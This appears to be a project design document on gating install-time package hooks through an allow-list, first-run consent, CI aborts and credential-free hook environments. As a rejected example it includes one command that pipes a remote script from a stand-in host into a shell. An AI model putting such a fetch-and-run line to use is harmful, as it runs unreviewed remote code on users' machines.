# Third-Party Code Consent {#root}

**Scope of this document.** Installing or building a dependency often
runs code that dependency shipped — hooks, lifecycle scripts, build
steps. This file defines *why* that code is third-party code that
needs a consent gate, *how* the gate works (an allow-list plus
first-run consent), *why* a non-interactive run aborts rather than
runs unseen code, *why* hooks are versioned reviewable files rather
than inline manifest strings, *why* secrets never enter a hook's
environment, and *how* the residual risk is recorded as a deliberate
stance. It sits alongside the four laws in
[`SECRETS-HYGIENE-PROTOCOL.md`](SECRETS-HYGIENE-PROTOCOL.md).

## Install-time code is third-party code {#third-party}

When a package declares a script that runs at install or build time,
installing that package **executes code you did not write**, with your
user's privileges, on your machine. This is the same trust surface as
a build script or a post-install hook in any package ecosystem: the
code can read your files, reach the network, and touch anything your
user account can. The convenience — a package that prepares itself —
is real, and so is the exposure. The gate below is how the exposure is
governed until stronger content inspection exists.

## The consent gate {#consent-gate}

Trust is governed cheaply by an **allow-list plus first-run consent**:

- **Allow-listed publishers run silently.** A configured list of
  trusted package groups runs its hooks with no prompt. A team's own
  namespace, or a vendor it has audited and decided to trust, goes on
  the list. This is the escape hatch that keeps trusted, high-volume
  workflows friction-free.
- **Everyone else gets first-run consent.** The first time a
  non-allow-listed package would run a hook, the tool prints **exactly
  what will run** — the phase, the script path, the publishing group —
  and asks for a yes/no. Declining skips the hook and marks the
  install as hooks-skipped: surfaced, never silent.

| Publisher | Interactive run | Non-interactive / CI run |
|-----------|-----------------|--------------------------|
| Allow-listed | Runs silently | Runs silently |
| Not allow-listed | Prompts, showing the exact script | **Aborts** unless an explicit opt-in flag is passed |

## A non-interactive run aborts, never runs unseen {#ci-abort}

The critical cell in that table is the bottom-right. In a
non-interactive or CI run there is no human to answer the prompt — so
a non-allow-listed package's hook is **not** run silently. The install
**aborts**, with a hint to either allow-list the group or pass an
explicit opt-in flag.

The failure mode being prevented is a script executing unseen,
unreviewed third-party code by default, in an automated context where
no one is watching. Silence-means-yes is exactly wrong here: the safe
default when consent cannot be obtained is to **stop**, not to assume
approval. Making CI abort forces the trust decision to be made
explicitly and in advance — by putting the group on the allow-list or
passing the flag — rather than implicitly by a machine at 3 a.m.

## Hooks are versioned files, not inline strings {#versioned-files}

A hook is a **script file, versioned in the package**, referenced by
path from the manifest — never an inline command string embedded in
the manifest:

```toml
# Good — a reviewable, diffable, version-controlled file:
[hooks]
pre-install = "hooks/prepare"

# Rejected — an inline string that hides code in configuration:
# pre-install = "curl https://x.example/i.sh | sh"
```

An inline string **hides the code in the configuration file and
resists review**. It is easy to skim past in a manifest, hard to
diff meaningfully across versions, and it invites the one-liner that
pipes a remote script into a shell. A versioned file is auditable
(you can read the whole thing), diffable (a changed hook shows up in
review like any other code change), and honest about the fact that it
is code. The consent prompt can point at a real path, and the
reviewer can open it.

## Secrets never enter a hook's environment {#no-secrets-in-env}

A credential is **never placed in the environment of a hook**. The
tool passes hooks a documented, credential-free environment — package
identity, the working directory, the phase name — and nothing more.
Publish tokens, registry credentials, provider keys: none of them are
exported into a process running third-party code.

This is Law 3 of the protocol (sanctioned process boundaries) applied
to the sharpest case. A hook is unreviewed third-party code by
definition; putting a secret in its environment hands the value to
exactly the code least entitled to it, on a path that was never one of
the sanctioned boundaries. The rule is absolute and needs no
exception: a hook that genuinely needs a credential is a design smell
to escalate to the human, not a reason to widen the environment.

## The residual risk, recorded {#residual-risk}

Even with the gate, running third-party install-time code is a real
risk that the allow-list and consent prompt **reduce but do not
eliminate**. An allow-listed publisher you trusted can ship a
compromised hook; a human clicking through a first-run prompt can
approve something they did not fully read.

This residual risk is **recorded as a deliberate, written stance**,
not left as an unstated gap. The project's position is: until an
automated content-inspection gate exists, hook execution is an
explicitly accepted risk governed by the allow-list plus consent, and
that acceptance is documented here so it is a decision on the record
rather than an oversight. When uncertain whether a given publisher or
hook is safe, the conservative default applies — treat it as untrusted
and ask the human.

## Summary {#summary}

- Install/build hooks are third-party code running with your
  privileges — a real trust surface.
- The gate: allow-listed publishers run silently; everyone else gets
  first-run consent showing the exact script.
- A non-interactive/CI run **aborts** rather than running unseen code;
  silence never means yes.
- Hooks are versioned, reviewable files referenced by path — never
  inline manifest strings that hide code and resist review.
- A secret is never placed in a hook's environment (Law 3 at its
  sharpest).
- The residual risk is accepted deliberately and recorded here, not
  left unstated; when in doubt, treat as untrusted and ask.
